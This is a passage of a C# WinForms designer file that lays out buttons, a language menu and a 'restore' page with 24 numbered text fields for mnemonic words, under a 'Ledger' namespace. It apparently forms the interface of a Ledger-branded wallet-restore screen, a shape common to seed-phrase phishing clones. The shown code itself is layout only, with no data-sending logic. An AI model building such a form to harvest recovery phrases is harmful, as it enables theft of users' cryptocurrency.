            this.cuiButton2.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton2.HoverForeColor = System.Drawing.Color.White;
            this.cuiButton2.HoverOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton2.Image = null;
            this.cuiButton2.ImageAutoCenter = true;
            this.cuiButton2.ImageExpand = new System.Drawing.Point(0, 0);
            this.cuiButton2.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton2.Location = new System.Drawing.Point(36, 755);
            this.cuiButton2.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton2.Name = "cuiButton2";
            this.cuiButton2.NormalBackground = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton2.NormalForeColor = System.Drawing.Color.White;
            this.cuiButton2.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton2.NormalOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton2.OutlineThickness = 1.6F;
            this.cuiButton2.PressedBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton2.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton2.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton2.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton2.Rounding = new System.Windows.Forms.Padding(18);
            this.cuiButton2.Size = new System.Drawing.Size(357, 49);
            this.cuiButton2.TabIndex = 1;
            this.cuiButton2.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton2.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton2.Click += new System.EventHandler(this.cuiButton2_Click);
            // 
            // cuiButton1
            // 
            this.cuiButton1.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.cuiButton1.CheckButton = false;
            this.cuiButton1.Checked = false;
            this.cuiButton1.CheckedBackground = System.Drawing.Color.White;
            this.cuiButton1.CheckedForeColor = System.Drawing.Color.Black;
            this.cuiButton1.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton1.CheckedOutline = System.Drawing.Color.White;
            this.cuiButton1.Content = "Get Started";
            this.cuiButton1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton1.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cuiButton1.ForeColor = System.Drawing.Color.Black;
            this.cuiButton1.HoverBackground = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton1.HoveredImageTint = System.Drawing.Color.Black;
            this.cuiButton1.HoverForeColor = System.Drawing.Color.Black;
            this.cuiButton1.HoverOutline = System.Drawing.Color.Empty;
            this.cuiButton1.Image = null;
            this.cuiButton1.ImageAutoCenter = true;
            this.cuiButton1.ImageExpand = new System.Drawing.Point(0, 0);
            this.cuiButton1.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton1.Location = new System.Drawing.Point(36, 702);
            this.cuiButton1.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton1.Name = "cuiButton1";
            this.cuiButton1.NormalBackground = System.Drawing.Color.White;
            this.cuiButton1.NormalForeColor = System.Drawing.Color.Black;
            this.cuiButton1.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton1.NormalOutline = System.Drawing.Color.Empty;
            this.cuiButton1.OutlineThickness = 1.6F;
            this.cuiButton1.PressedBackground = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton1.PressedForeColor = System.Drawing.Color.Black;
            this.cuiButton1.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton1.PressedOutline = System.Drawing.Color.Empty;
            this.cuiButton1.Rounding = new System.Windows.Forms.Padding(18);
            this.cuiButton1.Size = new System.Drawing.Size(357, 46);
            this.cuiButton1.TabIndex = 0;
            this.cuiButton1.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton1.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton1.Click += new System.EventHandler(this.cuiButton1_Click);
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.englishToolStripMenuItem,
            this.françaisToolStripMenuItem,
            this.deutschToolStripMenuItem,
            this.рyссийToolStripMenuItem,
            this.españolToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.ShowImageMargin = false;
            this.contextMenuStrip1.Size = new System.Drawing.Size(107, 124);
            // 
            // englishToolStripMenuItem
            // 
            this.englishToolStripMenuItem.Name = "englishToolStripMenuItem";
            this.englishToolStripMenuItem.Size = new System.Drawing.Size(106, 24);
            this.englishToolStripMenuItem.Text = "English";
            // 
            // françaisToolStripMenuItem
            // 
            this.françaisToolStripMenuItem.Name = "françaisToolStripMenuItem";
            this.françaisToolStripMenuItem.Size = new System.Drawing.Size(106, 24);
            this.françaisToolStripMenuItem.Text = "Français";
            // 
            // deutschToolStripMenuItem
            // 
            this.deutschToolStripMenuItem.Name = "deutschToolStripMenuItem";
            this.deutschToolStripMenuItem.Size = new System.Drawing.Size(106, 24);
            this.deutschToolStripMenuItem.Text = "Deutsch";
            // 
            // рyссийToolStripMenuItem
            // 
            this.рyссийToolStripMenuItem.Name = "рyссийToolStripMenuItem";
            this.рyссийToolStripMenuItem.Size = new System.Drawing.Size(106, 24);
            this.рyссийToolStripMenuItem.Text = "Рyссий";
            // 
            // españolToolStripMenuItem
            // 
            this.españolToolStripMenuItem.Name = "españolToolStripMenuItem";
            this.españolToolStripMenuItem.Size = new System.Drawing.Size(106, 24);
            this.españolToolStripMenuItem.Text = "Español";
            // 
            // Page4
            // 
            this.Page4.Controls.Add(this.panel4);
            this.Page4.Controls.Add(this.panel3);
            this.Page4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Page4.Location = new System.Drawing.Point(0, 0);
            this.Page4.Margin = new System.Windows.Forms.Padding(4);
            this.Page4.Name = "Page4";
            this.Page4.Size = new System.Drawing.Size(1604, 875);
            this.Page4.TabIndex = 5;
            this.Page4.Visible = false;
            // 
            // panel4
            // 
            this.panel4.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.restore1;
            this.panel4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.panel4.Controls.Add(this.mnem24);
            this.panel4.Controls.Add(this.mnem23);
            this.panel4.Controls.Add(this.mnem22);
            this.panel4.Controls.Add(this.mnem21);
            this.panel4.Controls.Add(this.mnem20);
            this.panel4.Controls.Add(this.mnem19);
            this.panel4.Controls.Add(this.mnem18);
            this.panel4.Controls.Add(this.mnem17);
            this.panel4.Controls.Add(this.mnem16);
            this.panel4.Controls.Add(this.mnem15);
            this.panel4.Controls.Add(this.mnem14);
            this.panel4.Controls.Add(this.label16);
            this.panel4.Controls.Add(this.label17);
            this.panel4.Controls.Add(this.label18);
            this.panel4.Controls.Add(this.label19);
            this.panel4.Controls.Add(this.label20);
            this.panel4.Controls.Add(this.label21);
            this.panel4.Controls.Add(this.label22);
            this.panel4.Controls.Add(this.label23);
            this.panel4.Controls.Add(this.label24);
            this.panel4.Controls.Add(this.label25);
            this.panel4.Controls.Add(this.label26);
            this.panel4.Controls.Add(this.label27);
            this.panel4.Controls.Add(this.mnem13);
            this.panel4.Controls.Add(this.mnem12);
            this.panel4.Controls.Add(this.mnem11);
            this.panel4.Controls.Add(this.mnem10);
            this.panel4.Controls.Add(this.mnem9);
            this.panel4.Controls.Add(this.mnem8);
            this.panel4.Controls.Add(this.mnem7);
            this.panel4.Controls.Add(this.mnem6);
            this.panel4.Controls.Add(this.mnem5);
            this.panel4.Controls.Add(this.mnem4);
            this.panel4.Controls.Add(this.mnem3);
            this.panel4.Controls.Add(this.mnem2);
            this.panel4.Controls.Add(this.label15);
            this.panel4.Controls.Add(this.label14);
            this.panel4.Controls.Add(this.label13);
            this.panel4.Controls.Add(this.label12);
            this.panel4.Controls.Add(this.label11);
            this.panel4.Controls.Add(this.label10);
            this.panel4.Controls.Add(this.label9);
            this.panel4.Controls.Add(this.label8);
            this.panel4.Controls.Add(this.label7);
            this.panel4.Controls.Add(this.label6);
            this.panel4.Controls.Add(this.label5);
            this.panel4.Controls.Add(this.label1);
            this.panel4.Controls.Add(this.mnem1);
            this.panel4.Controls.Add(this.Readybtn);
            this.panel4.Controls.Add(this.Backbt);
            this.panel4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel4.Location = new System.Drawing.Point(429, 0);
            this.panel4.Margin = new System.Windows.Forms.Padding(4);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(1175, 875);
            this.panel4.TabIndex = 11;
            // 
            // mnem24
            // 
            this.mnem24.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem24.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem24.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem24.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem24.ForeColor = System.Drawing.Color.White;
            this.mnem24.Location = new System.Drawing.Point(908, 866);
            this.mnem24.Margin = new System.Windows.Forms.Padding(5);
            this.mnem24.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem24.Multiline = true;
            this.mnem24.Name = "mnem24";
            this.mnem24.Size = new System.Drawing.Size(222, 39);
            this.mnem24.TabIndex = 68;
            // 
            // mnem23
            // 
            this.mnem23.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem23.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem23.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem23.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem23.ForeColor = System.Drawing.Color.White;
            this.mnem23.Location = new System.Drawing.Point(908, 806);
            this.mnem23.Margin = new System.Windows.Forms.Padding(5);
            this.mnem23.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem23.Multiline = true;
            this.mnem23.Name = "mnem23";
            this.mnem23.Size = new System.Drawing.Size(222, 39);
            this.mnem23.TabIndex = 67;
            // 
            // mnem22
            // 
            this.mnem22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem22.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem22.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem22.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem22.ForeColor = System.Drawing.Color.White;
            this.mnem22.Location = new System.Drawing.Point(908, 746);
            this.mnem22.Margin = new System.Windows.Forms.Padding(5);
            this.mnem22.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem22.Multiline = true;
            this.mnem22.Name = "mnem22";
            this.mnem22.Size = new System.Drawing.Size(222, 39);
            this.mnem22.TabIndex = 66;
            // 
            // mnem21
            // 
            this.mnem21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem21.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem21.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem21.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem21.ForeColor = System.Drawing.Color.White;
            this.mnem21.Location = new System.Drawing.Point(908, 686);
            this.mnem21.Margin = new System.Windows.Forms.Padding(5);
            this.mnem21.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem21.Multiline = true;
            this.mnem21.Name = "mnem21";
            this.mnem21.Size = new System.Drawing.Size(222, 39);
            this.mnem21.TabIndex = 65;
            // 
            // mnem20
            // 
            this.mnem20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem20.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem20.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem20.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem20.ForeColor = System.Drawing.Color.White;
            this.mnem20.Location = new System.Drawing.Point(908, 625);
            this.mnem20.Margin = new System.Windows.Forms.Padding(5);
            this.mnem20.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem20.Multiline = true;
            this.mnem20.Name = "mnem20";
            this.mnem20.Size = new System.Drawing.Size(222, 39);
            this.mnem20.TabIndex = 64;
            // 
            // mnem19
            // 
            this.mnem19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem19.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem19.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem19.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem19.ForeColor = System.Drawing.Color.White;
            this.mnem19.Location = new System.Drawing.Point(908, 565);
            this.mnem19.Margin = new System.Windows.Forms.Padding(5);
            this.mnem19.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem19.Multiline = true;
            this.mnem19.Name = "mnem19";
            this.mnem19.Size = new System.Drawing.Size(222, 39);
            this.mnem19.TabIndex = 63;
            // 
            // mnem18
            // 
            this.mnem18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem18.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem18.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem18.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem18.ForeColor = System.Drawing.Color.White;
            this.mnem18.Location = new System.Drawing.Point(908, 505);
            this.mnem18.Margin = new System.Windows.Forms.Padding(5);
            this.mnem18.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem18.Multiline = true;
            this.mnem18.Name = "mnem18";
            this.mnem18.Size = new System.Drawing.Size(222, 39);
            this.mnem18.TabIndex = 62;
            // 
            // mnem17
            // 
            this.mnem17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem17.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem17.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem17.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem17.ForeColor = System.Drawing.Color.White;
            this.mnem17.Location = new System.Drawing.Point(908, 444);
            this.mnem17.Margin = new System.Windows.Forms.Padding(5);
            this.mnem17.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem17.Multiline = true;
            this.mnem17.Name = "mnem17";
            this.mnem17.Size = new System.Drawing.Size(222, 39);
            this.mnem17.TabIndex = 61;
            // 
            // mnem16
            // 
            this.mnem16.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem16.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem16.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem16.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem16.ForeColor = System.Drawing.Color.White;
            this.mnem16.Location = new System.Drawing.Point(908, 384);
            this.mnem16.Margin = new System.Windows.Forms.Padding(5);
            this.mnem16.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem16.Multiline = true;
            this.mnem16.Name = "mnem16";
            this.mnem16.Size = new System.Drawing.Size(222, 39);
            this.mnem16.TabIndex = 60;
            // 
            // mnem15
            // 
            this.mnem15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem15.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem15.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem15.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem15.ForeColor = System.Drawing.Color.White;
            this.mnem15.Location = new System.Drawing.Point(908, 324);
            this.mnem15.Margin = new System.Windows.Forms.Padding(5);
            this.mnem15.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem15.Multiline = true;
            this.mnem15.Name = "mnem15";
            this.mnem15.Size = new System.Drawing.Size(222, 39);
            this.mnem15.TabIndex = 59;
            // 
            // mnem14
            // 
            this.mnem14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem14.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem14.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem14.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem14.ForeColor = System.Drawing.Color.White;
            this.mnem14.Location = new System.Drawing.Point(908, 263);
            this.mnem14.Margin = new System.Windows.Forms.Padding(5);
            this.mnem14.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem14.Multiline = true;
            this.mnem14.Name = "mnem14";
            this.mnem14.Size = new System.Drawing.Size(222, 39);
            this.mnem14.TabIndex = 58;
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.BackColor = System.Drawing.Color.Transparent;
            this.label16.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label16.ForeColor = System.Drawing.Color.DarkGray;
            this.label16.Location = new System.Drawing.Point(857, 886);
            this.label16.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(34, 20);
            this.label16.TabIndex = 57;
            this.label16.Text = "24.";
            this.label16.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.BackColor = System.Drawing.Color.Transparent;
            this.label17.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label17.ForeColor = System.Drawing.Color.DarkGray;
            this.label17.Location = new System.Drawing.Point(857, 826);
            this.label17.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(34, 20);
            this.label17.TabIndex = 56;
            this.label17.Text = "23.";
            this.label17.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.BackColor = System.Drawing.Color.Transparent;
            this.label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label18.ForeColor = System.Drawing.Color.DarkGray;
            this.label18.Location = new System.Drawing.Point(857, 766);
            this.label18.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(34, 20);
            this.label18.TabIndex = 55;
            this.label18.Text = "22.";
            this.label18.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.BackColor = System.Drawing.Color.Transparent;
            this.label19.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label19.ForeColor = System.Drawing.Color.DarkGray;
            this.label19.Location = new System.Drawing.Point(857, 705);
            this.label19.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(34, 20);
            this.label19.TabIndex = 54;
            this.label19.Text = "21.";
            this.label19.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.BackColor = System.Drawing.Color.Transparent;
            this.label20.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label20.ForeColor = System.Drawing.Color.DarkGray;
            this.label20.Location = new System.Drawing.Point(857, 645);
            this.label20.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(34, 20);
            this.label20.TabIndex = 53;
            this.label20.Text = "20.";
            this.label20.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.BackColor = System.Drawing.Color.Transparent;
            this.label21.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label21.ForeColor = System.Drawing.Color.DarkGray;
            this.label21.Location = new System.Drawing.Point(857, 585);
            this.label21.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(34, 20);
            this.label21.TabIndex = 52;
            this.label21.Text = "19.";
            this.label21.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.BackColor = System.Drawing.Color.Transparent;
            this.label22.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label22.ForeColor = System.Drawing.Color.DarkGray;
            this.label22.Location = new System.Drawing.Point(857, 524);
            this.label22.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(34, 20);
            this.label22.TabIndex = 51;
            this.label22.Text = "18.";
            this.label22.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.BackColor = System.Drawing.Color.Transparent;
            this.label23.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label23.ForeColor = System.Drawing.Color.DarkGray;
            this.label23.Location = new System.Drawing.Point(857, 464);
            this.label23.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(34, 20);
            this.label23.TabIndex = 50;
            this.label23.Text = "17.";
            this.label23.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label24
            // 
            this.label24.AutoSize = true;
            this.label24.BackColor = System.Drawing.Color.Transparent;
            this.label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label24.ForeColor = System.Drawing.Color.DarkGray;
            this.label24.Location = new System.Drawing.Point(857, 404);
            this.label24.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(34, 20);
            this.label24.TabIndex = 49;
            this.label24.Text = "16.";
            this.label24.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.BackColor = System.Drawing.Color.Transparent;
            this.label25.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label25.ForeColor = System.Drawing.Color.DarkGray;
            this.label25.Location = new System.Drawing.Point(857, 343);
            this.label25.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(34, 20);
            this.label25.TabIndex = 48;
            this.label25.Text = "15.";
            this.label25.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.BackColor = System.Drawing.Color.Transparent;
            this.label26.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label26.ForeColor = System.Drawing.Color.DarkGray;
            this.label26.Location = new System.Drawing.Point(857, 283);
            this.label26.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(34, 20);
            this.label26.TabIndex = 47;
            this.label26.Text = "14.";
            this.label26.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label27
            // 
            this.label27.AutoSize = true;
            this.label27.BackColor = System.Drawing.Color.Transparent;
            this.label27.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label27.ForeColor = System.Drawing.Color.DarkGray;
            this.label27.Location = new System.Drawing.Point(857, 223);
            this.label27.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(34, 20);
            this.label27.TabIndex = 46;
            this.label27.Text = "13.";
            this.label27.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // mnem13
            // 
            this.mnem13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem13.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem13.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem13.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem13.ForeColor = System.Drawing.Color.White;
            this.mnem13.Location = new System.Drawing.Point(908, 203);
            this.mnem13.Margin = new System.Windows.Forms.Padding(5);
            this.mnem13.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem13.Multiline = true;
            this.mnem13.Name = "mnem13";
            this.mnem13.Size = new System.Drawing.Size(222, 39);
            this.mnem13.TabIndex = 45;
            // 
            // mnem12
            // 
            this.mnem12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem12.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem12.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem12.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem12.ForeColor = System.Drawing.Color.White;
            this.mnem12.Location = new System.Drawing.Point(585, 866);
            this.mnem12.Margin = new System.Windows.Forms.Padding(5);
            this.mnem12.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem12.Multiline = true;
            this.mnem12.Name = "mnem12";
            this.mnem12.Size = new System.Drawing.Size(222, 39);
            this.mnem12.TabIndex = 44;
            this.mnem12.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem11
            // 
            this.mnem11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.mnem11.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.mnem11.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.mnem11.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mnem11.ForeColor = System.Drawing.Color.White;
            this.mnem11.Location = new System.Drawing.Point(585, 806);
            this.mnem11.Margin = new System.Windows.Forms.Padding(5);
            this.mnem11.MinimumSize = new System.Drawing.Size(5, 4);
            this.mnem11.Multiline = true;
            this.mnem11.Name = "mnem11";
            this.mnem11.Size = new System.Drawing.Size(222, 39);
            this.mnem11.TabIndex = 43;
            this.mnem11.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Mnem_KeyPress);
            // 
            // mnem10
            // 
